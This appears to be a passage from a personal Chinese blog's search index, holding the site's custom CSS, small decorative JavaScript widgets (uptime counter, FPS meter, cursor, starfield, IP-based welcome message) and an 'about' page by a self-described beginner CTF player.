      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[:root {  --trans-light: rgba(255, 255, 255, 0.75);  --trans-dark: rgba(25, 25, 25, 0.75);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }@font-face {  /* 为载入的字体取名字(随意) */  font-family: 'YSHST';  /* 字体文件地址(相对或者绝对路径都可以) */  src: url();  /* 定义加粗样式(加粗多少) */  font-weight: normal;  /* 定义字体样式(斜体/非斜体) */  font-style: normal;  /* 定义显示样式 */  font-display: block;}/* 一级菜单居中 */#nav .menus_items {  position: absolute !important;  width: fit-content !important;  left: 50% !important;  transform: translateX(-50%) !important;}/* 子菜单横向展示 */#nav .menus_items .menus_item:hover .menus_item_child {  display: flex !important;}/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */.menus_items .menus_item:nth-child(5) .menus_item_child {  left: -85px;}/* 背景宇宙星光  */#universe{  display: block;  position: fixed;  margin: 0;  padding: 0;  border: 0;  outline: 0;  left: 0;  top: 0;  width: 100%;  height: 100%;  pointer-events: none;  /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */  z-index: -1;}/* 侧边栏个人信息卡片动态渐变色 */#aside-content > .card-widget.card-info {  background: linear-gradient(    -45deg,    #e8d8b9,    #eccec5,    #a3e9eb,    #bdbdf0,    #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}/* 黑夜模式适配 */[data-theme="dark"] #aside-content > .card-widget.card-info {  background: #191919ee;}/* 个人信息Follow me按钮 */#aside-content > .card-widget.card-info > #card-info-btn {  background-color: #ffbd41;  border-radius: 8px;}/* 鼠标样式 */#cursor {  position: fixed;  width: 16px;  height: 16px;  /* 这里改变跟随的底色 */  background: rgb(248, 193, 134);  border-radius: 8px;  opacity: 0.25;  z-index: 10086;  pointer-events: none;  transition: 0.2s ease-in-out;  transition-property: background, opacity, transform;}#cursor.hidden {  opacity: 0;}#cursor.hover {  opacity: 0.1;  transform: scale(2.5);  -webkit-transform: scale(2.5);  -moz-transform: scale(2.5);  -ms-transform: scale(2.5);  -o-transform: scale(2.5);}#cursor.active {  opacity: 0.5;  transform: scale(0.5);  -webkit-transform: scale(0.5);  -moz-transform: scale(0.5);  -ms-transform: scale(0.5);  -o-transform: scale(0.5);}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts > .recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}.pace {  -webkit-pointer-events: none;  pointer-events: none;  -webkit-user-select: none;  -moz-user-select: none;  user-select: none;  z-index: 2000;  position: fixed;  margin: auto;  top: 4px;  left: 0;  right: 0;  height: 8px;  border-radius: 8px;  width: 7rem;  background: #eaecf2;  border: 1px #e3e8f7;  overflow: hidden}.pace-inactive .pace-progress {  opacity: 0;  transition: .3s ease-in}.pace .pace-progress {  -webkit-box-sizing: border-box;  -moz-box-sizing: border-box;  -ms-box-sizing: border-box;  -o-box-sizing: border-box;  box-sizing: border-box;  -webkit-transform: translate3d(0, 0, 0);  -moz-transform: translate3d(0, 0, 0);  -ms-transform: translate3d(0, 0, 0);  -o-transform: translate3d(0, 0, 0);  transform: translate3d(0, 0, 0);  max-width: 200px;  position: absolute;  z-index: 2000;  display: block;  top: 0;  right: 100%;  height: 100%;  width: 100%;  /* linear-gradient(to right, #3494e6, #ec6ead) */  background: linear-gradient(to right, #f3d397, #fcad02);  animation: gradient 2s ease infinite;  background-size: 200%}.pace.pace-inactive {  opacity: 0;  transition: .3s;  top: -8px}/* 文章页H1-H6图标样式效果 *//* 控制风车转动速度 4s那里可以自己调节快慢 */h1::before,h2::before,h3::before,h4::before,h5::before,h6::before {  -webkit-animation: ccc 4s linear infinite;  animation: ccc 4s linear infinite;}/* 控制风车转动方向 -1turn 为逆时针转动，1turn 为顺时针转动，相同数字部分记得统一修改 */@-webkit-keyframes ccc {  0% {    -webkit-transform: rotate(0deg);    transform: rotate(0deg);  }  to {    -webkit-transform: rotate(-1turn);    transform: rotate(-1turn);  }}@keyframes ccc {  0% {    -webkit-transform: rotate(0deg);    transform: rotate(0deg);  }  to {    -webkit-transform: rotate(-1turn);    transform: rotate(-1turn);  }}/* 设置风车颜色 */#content-inner.layout h1::before {  color: #5ac3ff;  margin-left: -1.55rem;  font-size: 1.3rem;  margin-top: -0.23rem;}#content-inner.layout h2::before {  color: #78ffe9;  margin-left: -1.35rem;  font-size: 1.1rem;  margin-top: -0.12rem;}#content-inner.layout h3::before {  color: #4affd8;  margin-left: -1.22rem;  font-size: 0.95rem;  margin-top: -0.09rem;}#content-inner.layout h4::before {  color: #a9e000;  margin-left: -1.05rem;  font-size: 0.8rem;  margin-top: -0.09rem;}#content-inner.layout h5::before {  color: #57c850;  margin-left: -0.9rem;  font-size: 0.7rem;  margin-top: 0rem;}#content-inner.layout h6::before {  color: #dd54ff;  margin-left: -0.9rem;  font-size: 0.66rem;  margin-top: 0rem;}/* s设置风车hover动效 6s那里可以自己调节快慢*/#content-inner.layout h1:hover,#content-inner.layout h2:hover,#content-inner.layout h3:hover,#content-inner.layout h4:hover,#content-inner.layout h5:hover,#content-inner.layout h6:hover {  color: var(--theme-color);}#content-inner.layout h1:hover::before,#content-inner.layout h2:hover::before,#content-inner.layout h3:hover::before,#content-inner.layout h4:hover::before,#content-inner.layout h5:hover::before,#content-inner.layout h6:hover::before {  color: var(--theme-color);  -webkit-animation: ccc 6s linear infinite;  animation: ccc 6s linear infinite;}.loading-img {  background: url(https://blogpic-5qb.pages.dev/img/avatar/neko.jpg) no-repeat center center;  background-size: cover;}/* 帧率检测 */#fps {  position: fixed;  /* 指定位置 */  right: 10px;  bottom: 2px;  z-index: 1919810;}[data-theme="light"] #fps {  background-color: rgba(255, 173, 86, 0.644);  backdrop-filter: var(--backdrop-filter);  padding: 4px;  border-radius: 4px;}[data-theme="dark"] #fps {  background-color: rgba(0, 0, 0, 0.72);  backdrop-filter: var(--backdrop-filter);  padding: 4px;  border-radius: 4px;}body::-webkit-scrollbar {  width: 0;}.neko {  width: 64px;  height: 64px;  background-image: url("https://bu.dusays.com/2022/07/20/62d812db74be9.png");  position: absolute;  right: 32px;  background-repeat: no-repeat;  background-size: contain;  transform: translateX(50%);  cursor: pointer;  font-family: tzy;  font-weight: 600;  font-size: 16px;  color: #ffa53e;  display: none;}.neko::after {  display: none;  width: 100px;  height: 100px;  background-image: url("https://bu.dusays.com/2022/07/20/62d812d95e6f5.png");  background-size: contain;  z-index: 9999;  position: absolute;  right: 50%;  text-align: center;  line-height: 100px;  top: -115%;}.neko.showMsg::after {  content: attr(data-msg);  display: block;  overflow: hidden;  text-overflow: ellipsis;}.neko:hover::after {  content: attr(data-msg);  display: block;  overflow: hidden;  text-overflow: ellipsis;}.neko.fontColor::after {  color: #333;}/*** @description: 滚动条样式  跟猫二选一*/@media screen and (max-width:992px) {  ::-webkit-scrollbar {      width: 8px !important;      height: 8px !important  }  ::-webkit-scrollbar-track {      border-radius: 2em;  }  ::-webkit-scrollbar-thumb {      background-color: rgba(255, 255, 255, 0.3);      background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.1) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.1) 50%, rgba(255, 255, 255, 0.1) 75%, transparent 75%, transparent);      border-radius: 2em  }  ::-webkit-scrollbar-corner {      background-color: transparent  }}/* 头像呼吸灯 */[data-theme="light"] .avatar-img {  animation: huxi_light 4s ease-in-out infinite;}[data-theme="dark"] .avatar-img {  animation: huxi_dark 4s ease-in-out infinite;}@keyframes huxi_light {  0% {    box-shadow: 0px 0px 1px 1px #ffdf77;  }  25% {    box-shadow: 0px 0px 5px 5px #ffcb59;  }  50% {    box-shadow: 0px 0px 5px 5px #ffc23f;  }  75% {    box-shadow: 0px 0px 5px 5px #fdb61d;  }  100% {    box-shadow: 0px 0px 1px 1px #ffb24d;  }}@keyframes huxi_dark {  0% {    box-shadow: 0px 0px 1px 1px #ffdf77;  }  25% {    box-shadow: 0px 0px 5px 5px #ffcb59;  }  50% {    box-shadow: 0px 0px 5px 5px #ffc23f;  }  75% {    box-shadow: 0px 0px 5px 5px #fdb61d;  }  100% {    box-shadow: 0px 0px 1px 1px #ffb24d;  }}/* 滚动条样式 */::-webkit-scrollbar {  width: 8px;  height: 8px;}::-webkit-scrollbar-track {  background-color: rgba(73, 177, 245, 0.2);  border-radius: 2em;}::-webkit-scrollbar-thumb {  background-color: var(rgb(255,158,53));  background-image: -webkit-linear-gradient(    45deg,    rgba(255, 255, 255, 0.4) 25%,    transparent 25%,    transparent 50%,    rgba(255, 255, 255, 0.4) 50%,    rgba(255, 255, 255, 0.4) 75%,    transparent 75%,    transparent  );  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: var(--theme-color);}/* 夜间模式菜单栏发光字 */[data-theme="dark"] #nav .site-page,[data-theme="dark"] #nav .menus_items .menus_item .menus_item_child li a {  text-shadow: 0 0 2px rgb(255, 158, 53) !important;}/* 手机端适配 */[data-theme="dark"] #sidebar #sidebar-menus .menus_items .site-page {  text-shadow: 0 0 2px rgb(255, 158, 53) !important;}/* 闪烁变动颜色连续渐变 */#site-name,#site-title,#site-subtitle,#post-info,.author-info__name,.author-info__description {  transition: text-shadow 1s linear !important;}/* 日间模式不生效 */[data-theme="light"] #site-name,[data-theme="light"] #site-title,[data-theme="light"] #site-subtitle,[data-theme="light"] #post-info {  animation: none;}/* 夜间模式生效 */[data-theme="dark"] #site-name,[data-theme="dark"] #site-title {  animation: light_15px 10s linear infinite;}[data-theme="dark"] #site-subtitle {  animation: light_10px 10s linear infinite;}[data-theme="dark"] #post-info {  animation: light_5px 10s linear infinite;}/* 关键帧描述 */@keyframes light_15px {  0% {    text-shadow: #5636ed 0 0 15px;  }  12.5% {    text-shadow: #11ee5e 0 0 15px;  }  25% {    text-shadow: #f14747 0 0 15px;  }  37.5% {    text-shadow: #f1a247 0 0 15px;  }  50% {    text-shadow: #f1ee47 0 0 15px;  }  50% {    text-shadow: #b347f1 0 0 15px;  }  62.5% {    text-shadow: #002afa 0 0 15px;  }  75% {    text-shadow: #ed709b 0 0 15px;  }  87.5% {    text-shadow: #39c5bb 0 0 15px;  }  100% {    text-shadow: #5636ed 0 0 15px;  }}@keyframes light_10px {  0% {    text-shadow: #5636ed 0 0 10px;  }  12.5% {    text-shadow: #11ee5e 0 0 10px;  }  25% {    text-shadow: #f14747 0 0 10px;  }  37.5% {    text-shadow: #f1a247 0 0 10px;  }  50% {    text-shadow: #f1ee47 0 0 10px;  }  50% {    text-shadow: #b347f1 0 0 10px;  }  62.5% {    text-shadow: #002afa 0 0 10px;  }  75% {    text-shadow: #ed709b 0 0 10px;  }  87.5% {    text-shadow: #39c5bb 0 0 10px;  }  100% {    text-shadow: #5636ed 0 0 10px;  }}@keyframes light_5px {  0% {    text-shadow: #5636ed 0 0 5px;  }  12.5% {    text-shadow: #11ee5e 0 0 5px;  }  25% {    text-shadow: #f14747 0 0 5px;  }  37.5% {    text-shadow: #f1a247 0 0 15px;  }  50% {    text-shadow: #f1ee47 0 0 5px;  }  50% {    text-shadow: #b347f1 0 0 5px;  }  62.5% {    text-shadow: #002afa 0 0 5px;  }  75% {    text-shadow: #ed709b 0 0 5px;  }  87.5% {    text-shadow: #39c5bb 0 0 5px;  }  100% {    text-shadow: #5636ed 0 0 5px;  }}/* 欢迎信息 */#welcome-info {  background: linear-gradient(45deg, #b9f4f3, #e3fbf9);  border-radius: 18px;  padding: 8px;}[data-theme="dark"] #welcome-info {  background: #ffb74caf;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="/comments/index.html"/>
      <url>/comments/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now=new Date;function createtime(){now.setTime(now.getTime()+1e3);var e=new Date("04/10/2023 00:00:00"),t=Math.trunc(234e8+(now-e)/1e3*17),a=(t/1496e5).toFixed(6),o=new Date("04/10/2023 00:00:00"),n=(now-o)/1e3/60/60/24,r=Math.floor(n),i=(now-o)/1e3/60/60-24*r,s=Math.floor(i);1==String(s).length&&(s="0"+s);var d=(now-o)/1e3/60-1440*r-60*s,l=Math.floor(d);1==String(l).length&&(l="0"+l);var g=(now-o)/1e3-86400*r-3600*s-60*l,b=Math.round(g);1==String(b).length&&(b="0"+b);let c="";c=s<18&&s>=9?`<img class='boardsign' src='' title=''><br>  <div style="font-size:13px;font-weight:bold">本店已开张 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div> </b> <br> <b> <font size = 2px>再看看那个光点，它就在那里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨✨</font></b> `:` <img class='boardsign' src='' title=''><br> <div style="font-size:13px;font-weight:bold">本店已开张 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div> </b> <br> <b> <font size = 2px>再看看那个光点，它就在那里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨✨</font></b> `,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=c)}setInterval((()=>{createtime()}),1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/fps.js"/>
      <url>/js/fps.js</url>
      
        <content type="html"><![CDATA[if (window.localStorage.getItem("fpson") == undefined || window.localStorage.getItem("fpson") == "1") {    var rAF = function () {        return (            window.requestAnimationFrame ||            window.webkitRequestAnimationFrame ||            function (callback) {                window.setTimeout(callback, 1000 / 60);            }        );    }();    var frame = 0;    var allFrameCount = 0;    var lastTime = Date.now();    var lastFameTime = Date.now();    var loop = function () {        var now = Date.now();        var fs = (now - lastFameTime);        var fps = Math.round(1000 / fs);        lastFameTime = now;        // 不置 0，在动画的开头及结尾记录此值的差值算出 FPS        allFrameCount++;        frame++;        if (now > 1000 + lastTime) {            var fps = Math.round((frame * 1000) / (now - lastTime));            if (fps <= 5) {                var kd = `<span style="color:#bd0000">好卡🤢</span>`            } else if (fps <= 15) {                var kd = `<span style="color:red">电竞级😖</span>`            } else if (fps <= 25) {                var kd = `<span style="color:orange">有点难受😨</span>`            } else if (fps < 35) {                var kd = `<span style="color:#9338e6">不太流畅🙄</span>`            } else if (fps <= 45) {                var kd = `<span style="color:#08b7e4">还不错哦😁</span>`            } else {                var kd = `<span style="color:#39c5bb">十分流畅🤣</span>`            }            document.getElementById("fps").innerHTML = `FPS:${fps} ${kd}`;            frame = 0;            lastTime = now;        };        rAF(loop);    }    loop();} else {    document.getElementById("fps").style = "display:none!important"}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/cursor.js"/>
      <url>/js/cursor.js</url>
      
        <content type="html"><![CDATA[var CURSOR;Math.lerp = (a, b, n) => (1 - n) * a + n * b;const getStyle = (el, attr) => {    try {        return window.getComputedStyle            ? window.getComputedStyle(el)[attr]            : el.currentStyle[attr];    } catch (e) {}    return "";};class Cursor {    constructor() {        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    move(left, top) {        this.cursor.style["left"] = `${left}px`;        this.cursor.style["top"] = `${top}px`;    }    create() {        if (!this.cursor) {            this.cursor = document.createElement("div");            this.cursor.id = "cursor";            this.cursor.classList.add("hidden");            document.body.append(this.cursor);        }        var el = document.getElementsByTagName('*');        for (let i = 0; i < el.length; i++)            if (getStyle(el[i], "cursor") == "pointer")                this.pt.push(el[i].outerHTML);        document.body.appendChild((this.scr = document.createElement("style")));        // 这里改变鼠标指针的颜色 由svg生成        this.scr.innerHTML = `* {cursor: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'><circle cx='4' cy='4' r='4' opacity='1.0' fill='rgb(255, 158, 53)'/></svg>") 4 4, auto}`;    }    refresh() {        this.scr.remove();        this.cursor.classList.remove("hover");        this.cursor.classList.remove("active");        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    init() {        document.onmouseover  = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.add("hover");        document.onmouseout   = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.remove("hover");        document.onmousemove  = e => {(this.pos.curr == null) && this.move(e.clientX - 8, e.clientY - 8); this.pos.curr = {x: e.clientX - 8, y: e.clientY - 8}; this.cursor.classList.remove("hidden");};        document.onmouseenter = e => this.cursor.classList.remove("hidden");        document.onmouseleave = e => this.cursor.classList.add("hidden");        document.onmousedown  = e => this.cursor.classList.add("active");        document.onmouseup    = e => this.cursor.classList.remove("active");    }    render() {        if (this.pos.prev) {            this.pos.prev.x = Math.lerp(this.pos.prev.x, this.pos.curr.x, 0.15);            this.pos.prev.y = Math.lerp(this.pos.prev.y, this.pos.curr.y, 0.15);            this.move(this.pos.prev.x, this.pos.prev.y);        } else {            this.pos.prev = this.pos.curr;        }        requestAnimationFrame(() => this.render());    }}(() => {    CURSOR = new Cursor();    // 需要重新获取列表时，使用 CURSOR.refresh()})();]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于店长</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>怎么说呢</p><p>唔，很高兴你能来到这这间随波逐流的旅店😀</p><p>自我介绍一下吧😳</p><p>我是这间旅店的店长，一个菜菜的ctfer😭，坐标飘忽不定，可能天南海北都可以找到我呢</p><p>这是一个一时兴起（<del>蓄谋已久</del>）的博客，主要是写写自己打过的靶机，学过的网安相关的知识（<del>倒点垃圾</del>）</p><p>主营 python / 靶场 / 网安相关知识 / 偶尔也会打打galgame / 绝铁崩鸣尘（人长在肝身上） /  重度二次元爱好者 / 喜欢看书，各种各样的书 / 有时候也会自己造点小垃圾丢在github里面，如果能帮到你那就更好了⭐⭐</p><p>崩铁喜欢宇宙大明星知更鸟小姐和流萤（<psw>一边点燃大海一边如果使一颗心免于哀伤莫名带感唉</psw>），崩三是忠实的爱莉厨，zzz正在寻找（怎么这么花心啊这个人😀）</p><p>喜欢收集各种各样的周边，欢迎来交流聊天扩列~</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/txmap.js"/>
      <url>/js/txmap.js</url>
      
        <content type="html"><![CDATA[//get请求$.ajax({    type: 'get',    url: 'https://apis.map.qq.com/ws/location/v1/ip',    data: {        key: 'OI2BZ-DIPLZ-S3HXM-7G2CI-KVBQE-R3FOC',        output: 'jsonp',    },    dataType: 'jsonp',    success: function (res) {        ipLoacation = res;    }})function getDistance(e1, n1, e2, n2) {     const R = 6371    const { sin, cos, asin, PI, hypot } = Math    let getPoint = (e, n) => {        e *= PI / 180        n *= PI / 180        return { x: cos(n) * cos(e), y: cos(n) * sin(e), z: sin(n) }    }    let a = getPoint(e1, n1)    let b = getPoint(e2, n2)    let c = hypot(a.x - b.x, a.y - b.y, a.z - b.z)    let r = asin(c / 2) * 2 * R    return Math.round(r);}function showWelcome() {    let dist = getDistance(121.00, 31.00, ipLoacation.result.location.lng, ipLoacation.result.location.lat); //这里换成自己的经纬度    let pos = ipLoacation.result.ad_info.nation;    let ip;    let posdesc;    //根据国家、省份、城市信息自定义欢迎语    switch (ipLoacation.result.ad_info.nation) {        case "日本":            posdesc = "よろしく，一起去看樱花吗";            break;        case "美国":            posdesc = "Let us live in peace!";            break;        case "英国":            posdesc = "想同你一起夜乘伦敦眼";            break;        case "俄罗斯":            posdesc = "干了这瓶伏特加！";            break;        case "法国":            posdesc = "C'est La Vie";            break;        case "德国":            posdesc = "Die Zeit verging im Fluge.";            break;        case "澳大利亚":            posdesc = "一起去大堡礁吧！";            break;        case "加拿大":            posdesc = "拾起一片枫叶赠予你";            break;        case "中国":            pos = ipLoacation.result.ad_info.province + " " + ipLoacation.result.ad_info.city + " " + ipLoacation.result.ad_info.district;            ip = ipLoacation.result.ip;            switch (ipLoacation.result.ad_info.province) {                case "北京市":                    posdesc = "北——京——欢迎你~~~";                    break;                case "天津市":                    posdesc = "讲段相声吧。";                    break;                case "河北省":                    posdesc = "山势巍巍成壁垒，天下雄关。铁马金戈由此向，无限江山。";                    break;                case "山西省":                    posdesc = "展开坐具长三尺，已占山河五百余。";                    break;                case "内蒙古自治区":                    posdesc = "天苍苍，野茫茫，风吹草低见牛羊。";                    break;                case "辽宁省":                    posdesc = "我想吃烤鸡架！";                    break;                case "吉林省":                    posdesc = "状元阁就是东北烧烤之王。";                    break;                case "黑龙江省":                    posdesc = "很喜欢哈尔滨大剧院。";                    break;                case "上海市":                    posdesc = "众所周知，中国只有两个城市。";                    break;                case "江苏省":                    switch (ipLoacation.result.ad_info.city) {                        case "南京市":                            posdesc = "这是我挺想去的城市啦。";                            break;                        case "苏州市":                            posdesc = "上有天堂，下有苏杭。";                            break;                        default:                            posdesc = "散装是必须要散装的。";                            break;                    }                    break;                case "浙江省":                    posdesc = "东风渐绿西湖柳，雁已还人未南归。";                    break;                case "河南省":                    switch (ipLoacation.result.ad_info.city) {                        case "郑州市":                            posdesc = "豫州之域，天地之中。";                            break;                        case "南阳市":                            posdesc = "臣本布衣，躬耕于南阳。此南阳非彼南阳！";                            break;                        case "驻马店市":                            posdesc = "峰峰有奇石，石石挟仙气。嵖岈山的花很美哦！";                            break;                        case "开封市":                            posdesc = "刚正不阿包青天。";                            break;                        case "洛阳市":                            posdesc = "洛阳牡丹甲天下。";                            break;                        default:                            posdesc = "可否带我品尝河南烩面啦？";                            break;                    }                    break;                case "安徽省":                    posdesc = "蚌埠住了，芜湖起飞。";                    break;                case "福建省":                    posdesc = "井邑白云间，岩城远带山。";                    break;                case "江西省":                    posdesc = "落霞与孤鹜齐飞，秋水共长天一色。";                    break;                case "山东省":                    posdesc = "遥望齐州九点烟，一泓海水杯中泻。";                    break;                case "湖北省":                    posdesc = "来碗热干面！";                    break;                case "湖南省":                    posdesc = "74751，长沙斯塔克。";                    break;                case "广东省":                    posdesc = "老板来两斤福建人。";                    break;                case "广西壮族自治区":                    posdesc = "桂林山水甲天下。";                    break;                case "海南省":                    posdesc = "朝观日出逐白浪，夕看云起收霞光。";                    break;                case "四川省":                    posdesc = "康康川妹子。";                    break;                case "贵州省":                    posdesc = "茅台，学生，再塞200。";                    break;                case "云南省":                    posdesc = "玉龙飞舞云缠绕，万仞冰川直耸天。";                    break;                case "西藏自治区":                    posdesc = "躺在茫茫草原上，仰望蓝天。";                    break;                case "陕西省":                    posdesc = "来份臊子面加馍。";                    break;                case "甘肃省":                    posdesc = "羌笛何须怨杨柳，春风不度玉门关。";                    break;                case "青海省":                    posdesc = "牛肉干和老酸奶都好好吃。";                    break;                case "宁夏回族自治区":                    posdesc = "大漠孤烟直，长河落日圆。";                    break;                case "新疆维吾尔自治区":                    posdesc = "驼铃古道丝绸路，胡马犹闻唐汉风。";                    break;                case "台湾省":                    posdesc = "我在这头，大陆在那头。";                    break;                case "香港特别行政区":                    posdesc = "永定贼有残留地鬼嚎，迎击光非岁玉。";                    break;                case "澳门特别行政区":                    posdesc = "性感荷官，在线发牌。";                    break;                default:                    posdesc = "带我去你的城市逛逛吧！";                    break;            }            break;        default:            posdesc = "带我去你的国家逛逛吧。";            break;    }    //根据本地时间切换欢迎语    let timeChange;    let date = new Date();    if (date.getHours() >= 5 && date.getHours() < 11) timeChange = "<span>上午好</span>，一日之计在于晨！";    else if (date.getHours() >= 11 && date.getHours() < 13) timeChange = "<span>中午好</span>，该摸鱼吃午饭了。";    else if (date.getHours() >= 13 && date.getHours() < 15) timeChange = "<span>下午好</span>，懒懒地睡个午觉吧！";    else if (date.getHours() >= 15 && date.getHours() < 16) timeChange = "<span>三点几啦</span>，一起饮茶呀！";    else if (date.getHours() >= 16 && date.getHours() < 19) timeChange = "<span>夕阳无限好！</span>";    else if (date.getHours() >= 19 && date.getHours() < 24) timeChange = "<span>晚上好</span>，夜生活嗨起来！";    else timeChange = "夜深了，早点休息，少熬夜。";    try {        //自定义文本和需要放的位置        document.getElementById("welcome-info").innerHTML =            `<b><center>🎉 欢迎信息 🎉</center>&emsp;&emsp;欢迎来自 <span style="color:var(--theme-color)">${pos}</span> 的小伙伴，${timeChange}您现在距离站长约 <span style="color:var(--theme-color)">${dist}</span> 公里，当前的IP地址为： <span style="color:var(--theme-color)">${ip}</span>， ${posdesc}</b>`;    } catch (err) {        // console.log("Pjax无法获取#welcome-info元素🙄🙄🙄")    }}window.onload = showWelcome;// 如果使用了pjax在加上下面这行代码document.addEventListener('pjax:complete', showWelcome);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/universe.js"/>
      <url>/js/universe.js</url>
      
        <content type="html"><![CDATA[function dark() {window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var n,e,i,h,t=.05,s=document.getElementById("universe"),o=!0,a="180,184,240",r="226,225,142",d="226,225,224",c=[];function f(){n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute("width",n),s.setAttribute("height",e)}function u(){h.clearRect(0,0,n,e);for(var t=c.length,i=0;i<t;i++){var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()}}function y(){this.reset=function(){this.giant=m(3),this.comet=!this.giant&&!o&&m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)},this.fadeIn=function(){this.fadingIn&&(this.fadingIn=!(this.opacity>this.opacityTresh),this.opacity+=this.do)},this.fadeOut=function(){this.fadingOut&&(this.fadingOut=!(this.opacity<0),this.opacity-=this.do/2,(this.x>n||this.y<0)&&(this.fadingOut=!1,this.reset()))},this.draw=function(){if(h.beginPath(),this.giant)h.fillStyle="rgba("+a+","+this.opacity+")",h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet){h.fillStyle="rgba("+d+","+this.opacity+")",h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t<30;t++)h.fillStyle="rgba("+d+","+(this.opacity-this.opacity/20*t)+")",h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()}else h.fillStyle="rgba("+r+","+this.opacity+")",h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()},this.move=function(){this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&&this.reset(),(this.x>n-n/4||this.y<0)&&(this.fadingOut=!0)},setTimeout(function(){o=!1},50)}function m(t){return Math.floor(1e3*Math.random())+1<10*t}function l(t,i){return Math.random()*(i-t)+t}f(),window.addEventListener("resize",f,!1),function(){h=s.getContext("2d");for(var t=0;t<i;t++)c[t]=new y,c[t].reset();u()}(),function 